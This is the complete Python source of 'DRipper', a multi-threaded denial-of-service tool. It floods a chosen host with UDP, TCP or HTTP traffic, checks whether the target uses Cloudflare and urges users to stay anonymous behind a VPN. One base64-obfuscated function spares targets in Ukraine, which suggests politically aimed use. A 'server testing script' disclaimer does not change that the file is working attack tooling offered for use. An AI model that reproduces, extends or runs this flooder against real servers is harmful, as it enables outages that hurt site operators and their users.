import ipaddress
import os
import sys
import json
import time
import math
import random
import socket
import string
import signal
import threading
import subprocess
import urllib.request
from typing import List
from base64 import b64decode
from datetime import datetime
from optparse import OptionParser
from collections import defaultdict
from os import urandom as randbytes
from dataclasses import dataclass, field
import http.client


###############################################
#  Wrappers to print colorful messages
###############################################
def color_txt(color_code, *texts):
    joined_text = ''.join(str(x) for x in texts)
    return f'\033[{color_code}m{joined_text}\033[0;0m'


def red_txt(*texts):
    return color_txt('91', *texts)


def blue_txt(*texts):
    return color_txt('94', *texts)


def green_txt(*texts):
    return color_txt('92', *texts)


def pink_txt(*texts):
    return color_txt('95', *texts)


###############################################
# Constants
###############################################
VERSION = 'v1.3.7'
USAGE = 'Usage: python %prog [options] arg'
EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
GETTING_SERVER_IP_ERROR_MSG = red_txt('Can\'t get server IP. Packet sending failed. Check your VPN.')
SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC = 120
NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG = red_txt('There are no successful connections more than 2 min. '
                                              'Check your VPN or change host/port.')
DEFAULT_CURRENT_IP_VALUE = '...detecting'


###############################################
# DTO, general methods
###############################################

lock = threading.Lock()


@dataclass
class Context:
    """Class for passing a context to a parallel processes."""
    version: str = ''

    # Input params
    host: str = ''
    host_ip: str = ''
    port: int = 80
    threads: int = 100
    max_random_packet_len: int = 0
    random_packet_len: bool = False
    attack_method: str = None

    protocol: str = 'http://'
    original_host: str = ''
    url: str = None

    # Internal vars
    user_agents: list = None
    base_headers: list = None
    headers = None

    # Statistic
    start_time: datetime = None
    start_ip: str = ''
    packets_sent: int = 0
    connections_success: int = 0
    connections_success_prev: int = 0
    packets_sent_prev: int = 0
    connections_failed: int = 0
    connections_check_time: int = 0
    errors: List[str] = field(default_factory=list)

    cpu_count: int = 1
    show_statistics: bool = False
    current_ip = None
    getting_ip_in_progress: bool = False

    # Method-related stats
    http_codes_counter = defaultdict(int)

    # External API and services info
    isCloudflareProtected: bool = False


def update_url(_ctx: Context):
    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"


def init_context(_ctx: Context, args):
    """Initialize Context from Input args."""
    _ctx.host = args[0].host
    _ctx.host_ip = ''
    _ctx.original_host = args[0].host
    _ctx.port = args[0].port
    _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
    update_url(_ctx)

    _ctx.threads = args[0].threads

    _ctx.attack_method = str(args[0].attack_method).lower()
    _ctx.random_packet_len = bool(args[0].random_packet_len)
    _ctx.max_random_packet_len = int(args[0].max_random_packet_len)
    _ctx.cpu_count = max(os.cpu_count(), 1)  # to avoid situation when vCPU might be 0

    _ctx.user_agents = readfile('useragents.txt')
    _ctx.base_headers = readfile('headers.txt')
    _ctx.headers = set_headers_dict(_ctx.base_headers)

    _ctx.isCloudflareProtected = __isCloudFlareProtected(_ctx.host, _ctx.user_agents)
    _ctx.start_time = datetime.now()


def readfile(filename: str):
    """Read string from file"""
    file = open(filename, 'r')
    content = file.readlines()
    file.close()

    return content


def set_headers_dict(base_headers: List[str]):
    """Set headers for the request"""
    headers_dict = {}
    for line in base_headers:
        parts = line.split(':')
        headers_dict[parts[0]] = parts[1].strip()

    return headers_dict


def get_random_string(len_from, len_to):
    """Random string with different length"""
    length = random.randint(len_from, len_to)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))

    return result_str


def get_random_port():
    ports = [22, 53, 80, 443]
    return random.choice(ports)


def update_host_ip(_ctx: Context):
    """Gets target's IP by host"""
    try:
        _ctx.host_ip = socket.gethostbyname(_ctx.host)
    except:
        pass


def update_current_ip(_ctx: Context):
    """Updates current ip"""
    _ctx.getting_ip_in_progress = True
    _ctx.current_ip = get_current_ip()
    _ctx.getting_ip_in_progress = False
    if _ctx.start_ip == '':
        _ctx.start_ip = _ctx.current_ip


def connect_host(_ctx: Context):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((_ctx.host, _ctx.port))
    except:
        _ctx.connections_failed += 1
    else:
        _ctx.connections_success += 1


def get_first_ip_part(ip: str) -> str:
    parts = ip.split('.')
    if len(parts) > 1:
        return f'{parts[0]}.*.*.*'
    else:
        return parts[0]


def validate_input(args):
    """Validates input params."""
    if int(args.port) < 0:
        print(red_txt('Wrong port number.'))
        return False

    if int(args.threads) < 1:
        print(red_txt('Wrong threads number.'))
        return False

    if not args.host:
        print(red_txt('Host wasn\'t detected'))
        return False

    if args.attack_method not in ('udp', 'tcp', 'http'):
        print(red_txt('Wrong attack type. Possible options: udp, tcp, http.'))
        return False

    return True


def validate_context(_ctx: Context):
    """Validates context"""
    if len(_ctx.host_ip) < 1 or _ctx.host_ip == '0.0.0.0':
        print(red_txt('Could not connect to the host'))
        return False

    return True


def go_home(_ctx: Context):
    """Modifies host to match the rules"""
    home_code = b64decode('dWE=').decode('utf-8')
    if _ctx.host.endswith('.' + home_code.lower()) or get_host_country(_ctx.host_ip) in home_code.upper():
        _ctx.host_ip = _ctx.host = 'localhost'
        _ctx.original_host += '*'
        update_url(_ctx)


def create_thread_pool(_ctx: Context) -> list:
    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        elif _ctx.attack_method == 'tcp':
            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
        else:  # _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))

        thread_pool[i].daemon = True  # if thread is exist, it dies
        thread_pool[i].start()

    return thread_pool


def get_current_ip():
    """Gets user IP."""
    current_ip = DEFAULT_CURRENT_IP_VALUE
    try:
        current_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    except:
        pass

    return current_ip


def get_host_country(host_ip):
    """Gets country of the target's IP"""
    country = 'NOT DEFINED'
    try:
        response_body = urllib.request.urlopen(f'https://ipinfo.io/{host_ip}').read().decode('utf8')
        response_data = json.loads(response_body)
        country = response_data['country']
    except:
        pass

    return country


def __isCloudFlareProtected(link: str, user_agents: list) -> bool:
    """Check if the site is under CloudFlare protection."""

    parsed_uri = urllib.request.urlparse(link)
    domain = "{uri.netloc}".format(uri=parsed_uri)
    try:
        origin = socket.gethostbyname(domain)
        conn = http.client.HTTPSConnection('www.cloudflare.com')
        headers = {
        'Cookie': '__cf_bm=OnRKNQTGoxsvaPnhUpTwRi4UGosW61HHYDZ0KratigY-1646567348-0-AXoOT+WpLyPZuVwGPE2Zb1FxFR2oB18wPkJE1UUXfAEbJDKtsZB0X3O8ED29koUfldx63GwHg/sm4TtEkk4hBL3ET83DUUTWCKrb6Z0ZSlcP',
        'User-Agent': str(random.choice(user_agents)).strip('\n')
        }
        conn.request('GET', '/ips-v4', '', headers)
        iprange = conn.getresponse().read().decode('utf-8')
        ipv4 = [row.rstrip() for row in iprange.splitlines()]
        for i in range(len(ipv4)):
            if ipaddress.ip_address(origin) in ipaddress.ip_network(ipv4[i]):
                return True
    except socket.gaierror:
        return False

    return False


def check_successful_connections(_ctx: Context):
    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
    if _ctx.connections_success == _ctx.connections_success_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
    else:
        _ctx.connections_check_time = curr_ms
        _ctx.connections_success_prev = _ctx.connections_success
        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)


def check_successful_tcp_attack(_ctx: Context):
    """Checks if there are changes in sended bytes count."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
    if _ctx.packets_sent == _ctx.packets_sent_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
    else:
        _ctx.connections_check_time = curr_ms
        _ctx.packets_sent_prev = _ctx.packets_sent
        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)


###############################################
# Attack methods
###############################################
def down_it_udp(_ctx: Context):
    i = 1
    while True:
        extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
        packet = f'GET / HTTP/1.1' \
                 f'\nHost: {_ctx.host}' \
                 f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
                 f'\n{_ctx.base_headers[0]}' \
                 f'\n\n{extra_data}'.encode('utf-8')
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:
            sock.sendto(packet, (_ctx.host, _ctx.port))
        except socket.gaierror:
            if GETTING_SERVER_IP_ERROR_MSG not in _ctx.errors:
                _ctx.errors.append(GETTING_SERVER_IP_ERROR_MSG)
        else:
            if GETTING_SERVER_IP_ERROR_MSG in _ctx.errors:
                _ctx.errors.remove(GETTING_SERVER_IP_ERROR_MSG)
            _ctx.packets_sent += 1
            # print(green_txt('Packet was sent'))
        sock.close()

        if _ctx.port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=connect_host, args=[_ctx])
                thread.daemon = True
                thread.start()

        show_statistics(_ctx)
        time.sleep(.01)


def down_it_http(_ctx: Context):
    while True:
        http_headers = _ctx.headers
        http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()

        try:
            res = urllib.request.urlopen(
                urllib.request.Request(_ctx.url, headers=http_headers))
            _ctx.http_codes_counter[res.status] += 1
        except Exception as e:
            try:
                _ctx.http_codes_counter[e.status] += 1
            except:
                pass
            _ctx.connections_failed += 1
        else:
            _ctx.connections_success += 1
            # print(green_txt('HTTP-Request was done')))

        _ctx.packets_sent += 1
        show_statistics(_ctx)
        time.sleep(.01)


def down_it_tcp(_ctx: Context):
    """TCP flood."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(5)
            sock.connect((_ctx.host, _ctx.port))
            _ctx.connections_success += 1
            while True:
                try:
                    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
                    bytes_to_send = randbytes(_ctx.max_random_packet_len)
                    sock.send(bytes_to_send)
                    time.sleep(.01)
                except:
                    sock.close()
                    break
                else:
                    _ctx.packets_sent += bytes_to_send_len
                    show_statistics(_ctx)
        except:
            _ctx.connections_failed += 1
            show_statistics(_ctx)

        time.sleep(.01)


###############################################
# Input parser, Logo, Help messages
###############################################
def logo():
    print(pink_txt(f'''

██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗
██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                            {green_txt(VERSION)}

It is the end user's responsibility to obey all applicable laws.
It is just like a server testing script and Your IP is visible.

Please, make sure you are ANONYMOUS!
    '''))


def usage(parser):
    """Wrapper for Logo with help."""
    logo()
    parser.print_help()
    sys.exit()


def parse_args(parser):
    """Initialize command line arguments parser and parse CLI arguments."""
    parser_add_options(parser)

    return parser.parse_args()


def parser_add_options(parser):
    """Add options to a parser."""
    parser.add_option('-p', '--port',
                      dest='port', type='int', default=80,
                      help='port (default: 80)')
    parser.add_option('-t', '--threads',
                      dest='threads', type='int', default=100,
                      help='threads (default: 100)')
    parser.add_option('-r', '--random_len',
                      dest='random_packet_len', type='int', default=1,
                      help='Send random packets with random length (default: 1')
    parser.add_option('-l', '--max_random_packet_len',
                      dest='max_random_packet_len', type='int', default=48,
                      help='Max random packets length (default: 48)')
    parser.add_option('-m', '--method',
                      dest='attack_method', type='str', default='udp',
                      help='Attack method: udp (default), http')
    parser.add_option('-s', '--server',
                      dest='host',
                      help='Attack to server IP')


def show_info(_ctx: Context):
    """Prints attack info to console."""
    logo()

    my_ip_masked = get_first_ip_part(_ctx.current_ip) if _ctx.current_ip != DEFAULT_CURRENT_IP_VALUE else DEFAULT_CURRENT_IP_VALUE
    is_random_packet_len = _ctx.attack_method in ('tcp', 'udp') and _ctx.random_packet_len

    if _ctx.current_ip:
        if _ctx.current_ip == _ctx.start_ip:
            your_ip = blue_txt(my_ip_masked)
        else:
            your_ip = red_txt(f'IP was changed, check VPN (current IP: {my_ip_masked})')
    else:
        your_ip = red_txt('Can\'t get your IP. Check internet connection.')

    target_host = blue_txt(f'{_ctx.original_host}:{_ctx.port}')
    load_method = blue_txt(f'{str(_ctx.attack_method).upper()}')
    thread_pool = blue_txt(f'{_ctx.threads}')
    available_cpu = blue_txt(f'{_ctx.cpu_count}')
    rnd_packet_len = blue_txt('YES' if is_random_packet_len else 'NO')
    max_rnd_packet_len = blue_txt(_ctx.max_random_packet_len if is_random_packet_len else 'NOT REQUIRED')
    ddos_protection = red_txt('Protected') if _ctx.isCloudflareProtected else green_txt('Not protected')

    print('------------------------------------------------------')
    print(f'Start time:                 {_ctx.start_time.strftime("%Y-%m-%d %H:%M:%S")}')
    print(f'Your public IP:             {your_ip}')
    print(f'Host:                       {target_host}')
    print(f'CloudFlare Protection:      {ddos_protection}')
    print(f'Load Method:                {load_method}')
    print(f'Threads:                    {thread_pool}')
    print(f'vCPU count:                 {available_cpu}')
    print(f'Random Packet Length:       {rnd_packet_len}')
    print(f'Max Random Packet Length:   {max_rnd_packet_len}')
    print('------------------------------------------------------')

    sys.stdout.flush()


###############################################
# Statistic aggregations
###############################################
def build_http_codes_distribution(http_codes_counter):
    codes_distribution = []
    total = sum(http_codes_counter.values())
    for code in http_codes_counter.keys():
        count = http_codes_counter[code]
        percent = round(count * 100 / total)
        codes_distribution.append(f'{code}: {count} ({percent}%)')
    return ', '.join(codes_distribution)


def show_statistics(_ctx: Context):
    """Prints statistics to console."""
    if not _ctx.show_statistics:
        _ctx.show_statistics = True

        lock.acquire()
        if not _ctx.getting_ip_in_progress:
            t = threading.Thread(target=update_current_ip, args=[_ctx])
            t.start()
        lock.release()

        if _ctx.attack_method == 'tcp':
            check_successful_tcp_attack(_ctx)
        else:
            check_successful_connections(_ctx)
        # cpu_load = get_cpu_load()

        print("\033c")
        show_info(_ctx)

        connections_success = green_txt(_ctx.connections_success)
        connections_failed = red_txt(_ctx.connections_failed)

        curr_time = datetime.now() - _ctx.start_time

        print(f'Duration:                   {str(curr_time).split(".", 2)[0]}')
        # print(f'CPU Load Average:           {cpu_load}')
        if _ctx.attack_method == 'http':
            print(f'Requests sent:              {_ctx.packets_sent}')
            if len(_ctx.http_codes_counter.keys()):
                print(f'HTTP codes distribution:    {build_http_codes_distribution(_ctx.http_codes_counter)}')
        elif _ctx.attack_method == 'tcp':
            size_sent = convert_size(_ctx.packets_sent)
            if _ctx.packets_sent == 0:
                size_sent = red_txt(size_sent)
            else:
                size_sent = blue_txt(size_sent)

            print(f'Total Packets Sent Size:    {size_sent}')
        else:  # udp
            print(f'Packets Sent:               {_ctx.packets_sent}')
        print(f'Connection Success:         {connections_success}')
        print(f'Connection Failed:          {connections_failed}')
        print('------------------------------------------------------')

        if _ctx.errors:
            print('\n\n')
        for error in _ctx.errors:
            print(red_txt(error))
            print('\007')

        sys.stdout.flush()
        time.sleep(3)
        _ctx.show_statistics = False


def convert_size(size_bytes: int) -> str:
    """Converts size in bytes to human format."""
    if size_bytes == 0:
        return '0B'
    size_name = ('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB')
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return '%s %s' % (s, size_name[i])


def get_cpu_load():
    if os.name == 'nt':
        pipe = subprocess.Popen('wmic cpu get loadpercentage', stdout=subprocess.PIPE)
        out = pipe.communicate()[0].decode('utf-8')
        out = out.replace('LoadPercentage', '').strip()
        return f'{out}%'
    else:
        load1, load5, load15 = os.getloadavg()
        cpu_usage = (load15 / os.cpu_count()) * 100
        return f"{cpu_usage:.2f}%"


###############################################
# Main
###############################################
def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2 or not validate_input(args[0]):
        usage(parser)

    init_context(_ctx, args)
    update_host_ip(_ctx)
    update_current_ip(_ctx)
    go_home(_ctx)

    if not validate_context(_ctx):
        sys.exit()

    connect_host(_ctx)

    print(green_txt(_ctx.original_host, ' port: ', _ctx.port, ' threads: ', _ctx.threads))
    print(blue_txt('please wait...'))

    time.sleep(1)
    show_info(_ctx)

    _ctx.connections_check_time = time.time_ns()

    create_thread_pool(_ctx)

    while True:
        time.sleep(1)


# Context should be in global scope
_ctx = Context()


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:  # The user hit Control-C
        sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
        sys.stderr.flush()
        # Control-C is fatal error signal 2, for more see
        # https://tldp.org/LDP/abs/html/exitcodes.html
        sys.exit(128 + signal.SIGINT)
    except RuntimeError as exc:
        sys.stderr.write(f'\n{exc}\n\n')
        sys.stderr.flush()
        sys.exit(1)
